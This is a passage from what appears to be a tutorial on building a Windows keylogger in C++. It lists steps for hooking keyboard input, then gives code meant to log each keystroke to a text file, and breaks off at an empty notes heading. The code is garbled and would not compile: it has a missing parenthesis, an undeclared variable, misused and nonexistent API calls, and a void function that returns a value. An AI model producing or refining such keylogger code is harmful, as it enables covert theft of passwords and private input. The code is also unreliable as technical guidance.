   - **Define the Hook Function**: Create a function to handle keyboard events.
   - **Set Up the Keyboard Hook**: Use `SetWindowsHook` to intercept keyboard input.
   - **Process Messages**: Use `GetMessage` in a loop to capture each message.
   - **Log Keystrokes**: Check if the message is a key press and log the keystroke.

4. **Code Implementation**:

```c++
#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <ctime>

using namespace std;

// Function prototype for the keyboard hook
void CALLBACK KeyboardHookProc(int hwnd, int wEvent, int wKey, int dwExtraInfo, int dwReserved);

// Function to log keystrokes
void logKeystroke(int key, int ctrl, int shift);

// Initialize the hook
int main() {
    HWND hwnd = GetDesktopWindow();
    HHOOK hKeyboardHook = 0;

    KeyboardHookProc *pfnHook = (KeyboardHookProc*)GetProcAddress(" kernel32.dll", "SetWindowsHook");

    hKeyboardHook = (long long) pfnHook(hwnd, WH_KEYBOARD_LL, KeyboardHookProc);

    if (hKeyboardHook == 0) {
        cout << "Failed to install keyboard hook." << endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(hwnd, &msg) {
        if (msg.message == WM_KEYDOWN) {
            logKeystroke(msg.wKey, msg.lParam, msg.time);
        }
    }

    UnhookWindowsHook(hwnd, hKeyboardHook);
    RemoveMessageQueue(hwnd);

    return 0;
}

// Function to handle keyboard events
void CALLBACK KeyboardHookProc(int hwnd, int wEvent, int wKey, int dwExtraInfo, int dwReserved) {
    if (wEvent == KEYDOWN) {
        logKeystroke(wKey, 0, 0);
    }
    return 0;
}

// Function to log keystrokes
void logKeystroke(int key, int ctrl, int shift) {
    ofstream file("KeystrokeLog.txt");
    file << time(&current_time);
    file << " ";
    file << (char)key;
    file << " - ";
    file << (ctrl ? "Ctrl + " : "") << (shift ? "Shift + " : "");
    file << " - ";
    file << (char)key;
    file << endl;
    file.close();
}
```

5. **Implementation Notes**:
